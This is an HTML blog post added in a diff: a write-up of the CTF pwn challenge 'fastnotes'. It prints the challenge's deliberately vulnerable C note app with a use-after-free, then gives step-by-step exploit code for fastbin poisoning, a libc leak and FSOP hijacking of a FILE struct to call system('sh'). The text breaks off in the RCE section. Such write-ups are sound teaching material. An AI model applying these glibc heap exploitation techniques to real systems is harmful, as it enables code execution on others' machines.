@@ -1,0 +1,694 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>BlahajCTF 2025</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>Nikola's blog</h1>
+    <span>ctf and stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">About</a> /
+    <a id="articles"class="info-link"href="/articles.html">Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        BlahajCTF 2025
+      </h1>
+      
+        <h2 id="article-subtitle">
+          Writeup for the pwn challenge fastnotes by FS in BlahajCTF 2025
+        </h2>
+      
+      <time id="article-date">
+        2025.12.9
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><a href="#challenge-protections">Challenge Protections</a><li><a href="#challenge">Challenge</a><li><a href="#solve-process">Solve Process</a><ul><li><a href="#fastbin-allocations%3A-not-quite-tcache">Fastbin Allocations: Not Quite Tcache</a></ul><li><a href="#malloc_consolidate%3A-unaligned-fastbin-chunk-detected">malloc_consolidate: unaligned fastbin chunk detected</a><li><a href="#rce">RCE</a><li><a href="#intended-solution-(%2Bseccomp)">Intended Solution (+seccomp)</a><ul><li><a href="#rce%3A-stack-pivoting-to-rop">RCE: Stack Pivoting to ROP</a></ul></ul></div><p></p>
+</details>
+<p>Last weekend, I participated in BlahajCTF 2025 with a few friends from secondary school. Among the many pwn challenges given, I solved all but two. “fastnotes”, by FS, is one of the challenges I solved (and blooded!), though the solve is far from what was intended by the challenge author.</p>
+<h2 id="challenge-protections"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/blahaj/2025/fastnotes/fastnotes'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+</code></pre>
+<p>All protections are enabled.</p>
+<h2 id="challenge"tabindex="-1">Challenge</h2>
+<pre class="hljs"><code><span class="hljs-comment">// gcc -o fastnotes fastnotes.c -fstack-protector -fPIE -pie -z relro -z now</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">createNote</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">viewNote</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">editNote</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">deleteNote</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">createSpecialNote</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">leave</span><span class="hljs-params">()</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">correctInput</span><span class="hljs-params">(<span class="hljs-type">char</span> *note, <span class="hljs-type">ssize_t</span> len)</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">somethingSpecial</span><span class="hljs-params">()</span>;
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NOTES 8</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> SZ_SPECIAL_NOTES 0x500</span>
+<span class="hljs-type">int</span> isCalled = <span class="hljs-number">0</span>;
+
+<span class="hljs-type">char</span> *chunk_ptrs[<span class="hljs-number">0x10</span>] = {<span class="hljs-number">0</span>};
+<span class="hljs-type">int</span> size_ptrs[<span class="hljs-number">0x10</span>] = {<span class="hljs-number">0</span>};
+<span class="hljs-type">char</span> *special_chunk_ptrs[<span class="hljs-number">2</span>] = {<span class="hljs-number">0</span>};
+<span class="hljs-type">void</span> **ptr_to_fp_chunk = <span class="hljs-literal">NULL</span>;
+<span class="hljs-type">int</span> idx = <span class="hljs-number">-1</span>;
+FILE *fp = <span class="hljs-literal">NULL</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span>
+{
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+    setup();
+    <span class="hljs-type">char</span> greeting[] = <span class="hljs-string">&quot;Welcome to the FAST notes taking app\n&quot;</span>;
+    write(<span class="hljs-number">1</span>, greeting, <span class="hljs-built_in">strlen</span>(greeting));
+    somethingSpecial();
+    menu();
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">int</span> opt = <span class="hljs-number">0</span>;
+    <span class="hljs-type">char</span> menuScreen[] = <span class="hljs-string">&quot;Choose what you want to do\n1: Create a note\n2: Edit a note\n3: View a note\n4: Delete a note\n5: Create Special Notes\n&quot;</span>;
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)
+    {
+        write(<span class="hljs-number">1</span>, menuScreen, <span class="hljs-built_in">strlen</span>(menuScreen));
+        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;opt);
+        <span class="hljs-keyword">switch</span> (opt)
+        {
+        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+            createNote();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+            editNote();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+            viewNote();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
+            deleteNote();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
+            createSpecialNote();
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">default</span>:
+            leave();
+        }
+    }
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">cleanUp</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">char</span> msg[] = <span class="hljs-string">&quot;byebye&quot;</span>;
+    fwrite(msg, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">6</span>, ptr_to_fp_chunk[<span class="hljs-number">0</span>]);
+    _exit(<span class="hljs-number">0</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">leave</span><span class="hljs-params">()</span>
+{
+    uint idx = <span class="hljs-number">0</span>;
+    write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hm...are you sure? Why not you edit 1 more note?\n&quot;</span>, <span class="hljs-number">50</span>);
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1</span>; i++)
+    {
+        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
+        <span class="hljs-type">int</span> c;
+        <span class="hljs-keyword">while</span> ((c = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF)
+            ;
+        <span class="hljs-keyword">if</span> (idx &lt; MAX_NOTES)
+        {
+            <span class="hljs-comment">/**the following lines were added to preserve my sanity */</span>
+            <span class="hljs-type">ssize_t</span> len = read(<span class="hljs-number">0</span>, ((<span class="hljs-type">char</span> *)chunk_ptrs[idx] - <span class="hljs-number">0x10</span>), *(<span class="hljs-type">size_t</span> *)((<span class="hljs-type">char</span> *)chunk_ptrs[idx] - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)));
+            correctInput(chunk_ptrs[idx], len);
+        }
+    }
+    cleanUp();
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">correctInput</span><span class="hljs-params">(<span class="hljs-type">char</span> *note, <span class="hljs-type">ssize_t</span> len)</span>
+{
+    <span class="hljs-keyword">if</span> (len &gt; <span class="hljs-number">0</span> &amp;&amp; note[len - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>)
+    {
+        note[len - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;
+    }
+    <span class="hljs-keyword">else</span>
+    {
+        note[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;
+    }
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">createNote</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-keyword">if</span> (idx &gt;= MAX_NOTES || isCalled)
+    {
+        write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;NO MORE!\n&quot;</span>, <span class="hljs-number">9</span>);
+        <span class="hljs-keyword">return</span>;
+    }
+    uint size = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;size);
+    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">0</span> &amp;&amp; size &lt;= <span class="hljs-number">0x80</span>)
+    {
+        <span class="hljs-type">char</span> *note = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));
+        <span class="hljs-type">ssize_t</span> len = read(<span class="hljs-number">0</span>, note, size - <span class="hljs-number">1</span>);
+        correctInput(note, len);
+        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strstr</span>(note, <span class="hljs-string">&quot;FAST:&quot;</span>) || size &gt; <span class="hljs-number">0x60</span>)
+        {
+            write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Disgusting\n&quot;</span>, <span class="hljs-number">11</span>);
+            <span class="hljs-built_in">free</span>(note);
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            idx++;
+            chunk_ptrs[idx] = note;
+            size_ptrs[idx] = size;
+        }
+    }
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">editNote</span><span class="hljs-params">()</span>
+{
+    uint idx = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
+    <span class="hljs-keyword">if</span> (idx &lt;= <span class="hljs-number">0x10</span> &amp;&amp; chunk_ptrs[idx] != <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-type">ssize_t</span> len = read(<span class="hljs-number">0</span>, chunk_ptrs[idx], size_ptrs[idx] - <span class="hljs-number">1</span>);
+        correctInput(chunk_ptrs[idx], size_ptrs[idx]);
+    }
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">viewNote</span><span class="hljs-params">()</span>
+{
+    uint idx = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
+    <span class="hljs-keyword">if</span> (idx &lt;= <span class="hljs-number">0x10</span> &amp;&amp; chunk_ptrs[idx] != <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-type">char</span> *note = chunk_ptrs[idx];
+        <span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">while</span> (note[len] != <span class="hljs-string">&#x27;\0&#x27;</span>)
+        {
+            len++;
+        }
+        write(<span class="hljs-number">1</span>, note, len);
+    }
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">deleteNote</span><span class="hljs-params">()</span>
+{
+    uint idx = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
+    <span class="hljs-keyword">if</span> (chunk_ptrs[idx] != <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-built_in">free</span>(chunk_ptrs[idx]);
+    }
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">somethingSpecial</span><span class="hljs-params">()</span>
+{
+    fp = fopen(<span class="hljs-string">&quot;/tmp/specialNotes.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>); <span class="hljs-comment">// not the flag in case you where wondering</span>
+    ptr_to_fp_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    *ptr_to_fp_chunk = (<span class="hljs-type">char</span> *)fp;
+    fp = <span class="hljs-literal">NULL</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">createSpecialNote</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-keyword">if</span> (isCalled &gt;= <span class="hljs-number">2</span>)
+    {
+        <span class="hljs-keyword">return</span>;
+    } <span class="hljs-comment">// you can&#x27;t run this function &gt; 2 times</span>
+    <span class="hljs-type">int</span> c;
+    <span class="hljs-keyword">while</span> ((c = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF)
+        ;
+    <span class="hljs-type">char</span> *specialNote = <span class="hljs-built_in">malloc</span>(SZ_SPECIAL_NOTES);
+    <span class="hljs-type">ssize_t</span> len = read(<span class="hljs-number">0</span>, specialNote, SZ_SPECIAL_NOTES - <span class="hljs-number">1</span>);
+    correctInput(specialNote, len);
+    special_chunk_ptrs[++idx] = specialNote;
+    isCalled++;
+    <span class="hljs-keyword">return</span>;
+}
+</code></pre>
+<p>This is a typical heap CRUD challenge with a UAF, except there are a few extra things:</p>
+<ol>
+<li>Allocations are handled with <code>calloc()</code> - this means that allocations do not pull from the tcache</li>
+<li>Allocations-to-be-saved are restricted to sizes less than or equal to 0x60 and must have ‘FAST:’ written into them</li>
+<li>If they do not fulfil the above criteria, they are allocated, and then freed without saving.</li>
+<li>You can allocate chunks of 0x500 with <code>malloc()</code> only twice, and they are saved into another allocation array. After allocating one of these chunks, you are not allowed to allocate further chunks with <code>calloc()</code></li>
+<li>There is a file struct allocated onto the heap, with another chunk containing a pointer to this file struct. When the program exits, <code>fwrite()</code> is called on this file struct through the pointer on the heap.</li>
+<li>We only have 8 allocations, hence we cannot perform just an ordinary <code>fd</code> hijack to gain arbitrary allocations</li>
+</ol>
+<p>Since the program exits with <code>_exit()</code> and <code>fwrite()</code> is called on the file struct pointer, the only way we can achieve remote code execution (RCE) is to hijack the file struct (or its pointer) and perform a File Stream Oriented Programming (FSOP) attack.</p>
+<h2 id="solve-process"tabindex="-1">Solve Process</h2>
+<p>At first, I was convinced that the attack strategy had something to do with fastbin consolidate 💀. My ahh was trying to find a way to corrupt the size header of the chunk with the file struct pointer so we could consolidate into the chunk with one of the 0x500 allocations, hijack the pointer and subsequently overlap the file struct (and its <code>wide_data</code>).</p>
+<p>However, I kept running into <code>malloc_consolidate</code> errors about “unaligned fastbin chunks” (I realised later on this could be resolved with a bit of fastbin fengshui but at this point I was desperate for time 💀).</p>
+<p>Eventually, my attack path resolved into the following:</p>
+<ol>
+<li>Find a way to corrupt the size header of an earlier-allocated chunk so we could forge a size, when freed, would fit into the unsorted bin, and give us a LIBC leak</li>
+<li>Hijack the chunk containing the file struct pointer to point to our forged file struct chunk as it so happens the chunk’s size falls within the fastbin range!</li>
+<li>Use the 0x500 allocations to write our file structs and <code>wide_data</code> fields.</li>
+</ol>
+<p>The only problem is figuring out how to gain enough allocations such that the heap is long enough (and aligned! chunks MUST end at another chunk’s size header) while keeping within the allocation limit of 8 times.</p>
+<p>In <code>createNote()</code>:</p>
+<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">createNote</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-keyword">if</span> (idx &gt;= MAX_NOTES || isCalled)
+    {
+        write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;NO MORE!\n&quot;</span>, <span class="hljs-number">9</span>);
+        <span class="hljs-keyword">return</span>;
+    }
+    uint size = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;size);
+    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">0</span> &amp;&amp; size &lt;= <span class="hljs-number">0x80</span>)
+    {
+        <span class="hljs-type">char</span> *note = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));
+        <span class="hljs-type">ssize_t</span> len = read(<span class="hljs-number">0</span>, note, size - <span class="hljs-number">1</span>);
+        correctInput(note, len);
+        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strstr</span>(note, <span class="hljs-string">&quot;FAST:&quot;</span>) || size &gt; <span class="hljs-number">0x60</span>)
+        {
+            write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Disgusting\n&quot;</span>, <span class="hljs-number">11</span>);
+            <span class="hljs-built_in">free</span>(note);
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            idx++;
+            chunk_ptrs[idx] = note;
+            size_ptrs[idx] = size;
+        }
+    }
+    <span class="hljs-keyword">return</span>;
+}
+</code></pre>
+<p>There is an initial check for the size to be within 0x80. If this is true, an allocation is made, and content is read into the chunk. Afterwards, there is a further check to see if the contents written start with “FAST:” AND if the size is greater than 0x60. If not, the chunk is freed and not saved.</p>
+<p>However, this still means that even if our chunk is deemed “invalid”, it is still allocated and thus <strong>expands the heap</strong>. This further comes in useful as <code>calloc()</code> will not draw from the tcache for our first seven “invalid” chunks, hence we can use this to get around the allocation limit and ensure the heap is large enough for our forged unsorted chunk:</p>
+<pre class="hljs"><code>create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>) <span class="hljs-comment"># To fill up the tcache for our arballoc chunk as well</span>
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+</code></pre>
+<p>We prepare two valid chunks at the start: one to accomodate our fastbin arballoc, and the other to be our forged unsorted chunk. Now, we can proceed to obtain the safelinking mangle (while getting heap base) and prepare for our arbitrary allocation to forge the chunk header:</p>
+<pre class="hljs"><code>free(<span class="hljs-number">0</span>)
+mangle = u64(view(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))
+log.info(<span class="hljs-string">&quot;mangle, %#x&quot;</span>, mangle)
+heap_base = mangle &lt;&lt; <span class="hljs-number">12</span>
+</code></pre>
+<h3 id="fastbin-allocations%3A-not-quite-tcache"tabindex="-1">Fastbin Allocations: Not Quite Tcache</h3>
+<p>The fastbin is a heap mechanism that, not unlike the tcache, uses a singly linked list to keep track of free chunks. When the tcache of a certain bin is filled up to 7 chunks, further free chunks go into the fastbin.</p>
+<p>However, while tcache poisoning grants a <strong>very</strong> (very) flexible mode of arbitrary allocations, the fastbin is quite so ore restrictive. This is because fastbin allocations <strong>check if the size header of the target chunk is the same as the corresponding fastbin</strong>. Hence, in order to arballoc to the chunk header of our victim chunk <strong>and overwrite it</strong>, we will need to forge a corresponding size header in the preceding chunk:</p>
+<pre class="hljs"><code>edit(<span class="hljs-number">0</span>, p64(mangle ^ (heap_base+<span class="hljs-number">0x4c0</span>))) <span class="hljs-comment"># Since the first chunk is the one we freed first anyway, let&#x27;s just reuse this for our arballoc </span>
+
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mangle)) <span class="hljs-comment"># Write the fake size header for the arbitrary alloc</span>
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x771</span>)) <span class="hljs-comment"># Forge size header on the victim chunk</span>
+</code></pre>
+<p><img src="/images/2025-12-09-19-47-01.png"alt="Prepare for arballoc"loading="lazy"decoding="async"width="1355"height="478">
+<img src="/images/2025-12-09-19-48-11.png"alt="Forge chunk header for arballoc"loading="lazy"decoding="async"width="1338"height="406">
+<img src="/images/2025-12-09-19-49-14.png"alt="Overwrite victim size header"loading="lazy"decoding="async"width="1142"height="428"></p>
+<p>Now we can get our LIBC leak and thus the base address:</p>
+<pre class="hljs"><code>libc.address = u64(view(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>)) - <span class="hljs-number">0x203b20</span>
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+</code></pre>
+<p>With our LIBC base, we can proceed to hijack the file struct pointer and forge our own file struct. We fill up the tcache for another bin:</p>
+<pre class="hljs"><code><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+    create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+</code></pre>
+<p>Now we can do another arballoc to allocate to the file struct pointer chunk and overwrite it with the soon-to-be location of our forged file structure:</p>
+<pre class="hljs"><code>create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+free(<span class="hljs-number">5</span>)
+edit(<span class="hljs-number">5</span>, p64(mangle ^ (heap_base+<span class="hljs-number">0x470</span>)))
+create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+edit(<span class="hljs-number">7</span>, p64(heap_base+<span class="hljs-number">0x5f0</span>))
+</code></pre>
+<h2 id="malloc_consolidate%3A-unaligned-fastbin-chunk-detected"tabindex="-1">malloc_consolidate: unaligned fastbin chunk detected</h2>
+<p>Yippee! That should be all right? We can now allocate our two special chunks for our file struct and <code>wide_data</code>:</p>
+<pre class="hljs"><code>stderr_addr = heap_base + <span class="hljs-number">0x610</span>
+wide_data = heap_base + <span class="hljs-number">0xcf0</span>
+
+fs = FileStructure()
+fs.flags = u64(<span class="hljs-string">&quot;  &quot;</span> + <span class="hljs-string">&quot;sh&quot;</span>.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;\x00&quot;</span>))
+fs._IO_write_base = <span class="hljs-number">0</span>
+fs._IO_write_ptr = <span class="hljs-number">1</span>
+fs._lock = stderr_addr+<span class="hljs-number">0x1000</span> <span class="hljs-comment"># Should be null</span>
+fs.chain = libc.sym.system
+fs._codecvt = stderr_addr
+<span class="hljs-comment"># stderr becomes it&#x27;s own wide data vtable</span>
+<span class="hljs-comment"># Offset is so that system (fs.chain) is called</span>
+fs._wide_data = wide_data
+fs.vtable = libc.sym._IO_wfile_jumps - <span class="hljs-number">0x38</span> + <span class="hljs-number">0x18</span>
+
+create_sp(<span class="hljs-built_in">bytes</span>(fs))
+create_sp(flat({
+    <span class="hljs-number">0x48</span>+<span class="hljs-number">0x68</span>:libc.sym.system,
+    <span class="hljs-number">0xe0</span>:wide_data+<span class="hljs-number">0x48</span>
+}, filler=<span class="hljs-string">b&#x27;\0&#x27;</span>))
+</code></pre>
+<p>However, if we try this, we run into an error:
+<img src="/images/2025-12-09-20-00-26.png"alt="the error"loading="lazy"decoding="async"width="1407"height="605"></p>
+<p>How can this even be? We don’t even have any fastbin chunks in the fastbin left!
+<img src="/images/2025-12-09-20-01-06.png"alt="fastbin"loading="lazy"decoding="async"width="975"height="583"></p>
+<p>It turns out that when chunks in the unsorted range are allocated, GLIBC does a check:</p>
+<pre class="hljs"><code>   <span class="hljs-meta">#<span class="hljs-keyword">define</span> misaligned_chunk(p) \
+  ((uintptr_t)(MALLOC_ALIGNMENT == CHUNK_HDR_SZ ? (p) : chunk2mem (p)) \
+   &amp; MALLOC_ALIGN_MASK) <span class="hljs-comment">// Checks if p is 16-bit aligned: the last digit is 0</span></span>
+   ... 
+    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) {
+      <span class="hljs-keyword">do</span> {
+	{
+	  <span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))
+	    malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): &quot;</span>
+			     <span class="hljs-string">&quot;unaligned fastbin chunk detected&quot;</span>);
+
+	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index (chunksize (p));
+	  <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)
+	    malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);
+	}
+</code></pre>
+<p>When <code>malloc_consolidate()</code> is called, GLIBC checks if every chunk in <code>malloc_state</code> is 16-bit aligned i.e. the last digit is zero.
+We can break at <code>malloc_consolidate()</code> to see the state of <code>malloc_state</code> when we try to allocate our special chunk:</p>
+<p><img src="/images/2025-12-09-20-04-22.png"alt="malloc state"loading="lazy"decoding="async"width="1306"height="637"></p>
+<p>Indeed, we can see that there is a corrupted address in one of the fastbins! This is because of the residual corruption left by us when we try to arballoc.</p>
+<p>After we claim our target chunk, the following happens in the fastbin freelist:</p>
+<pre class="hljs"><code><span class="hljs-comment">// head -&gt; c0 -&gt; target -&gt; value ^ (target &gt;&gt; 12)</span>
+<span class="hljs-comment">// head -&gt; value ^ (target &gt;&gt; 12) &lt;-- THIS IS CORRUPTED</span>
+</code></pre>
+<p>To resolve this, before we allocate our special chunks, we can instead free a valid chunk into the corresponding fastbin and terminate the fastbin there so <code>malloc_consolidate</code> thinks all the fastbins are valid:</p>
+<pre class="hljs"><code>create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+free(<span class="hljs-number">5</span>)
+edit(<span class="hljs-number">5</span>, p64(mangle ^ (heap_base+<span class="hljs-number">0x470</span>)))
+create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+edit(<span class="hljs-number">7</span>, p64(heap_base+<span class="hljs-number">0x5f0</span>))
+free(<span class="hljs-number">6</span>)
+edit(<span class="hljs-number">6</span>, p64(mangle)) <span class="hljs-comment"># To trick the fastbin into thinking there are no other chunks</span>
+</code></pre>
+<p>Now, we are able to allocate our special chunks without an error!</p>
+<h2 id="rce"tabindex="-1">RCE</h2>
+<p>When <code>fwrite()</code> is called on a file struct, the <code>_IO_XSPUTN</code> offset of the vtable is called:</p>
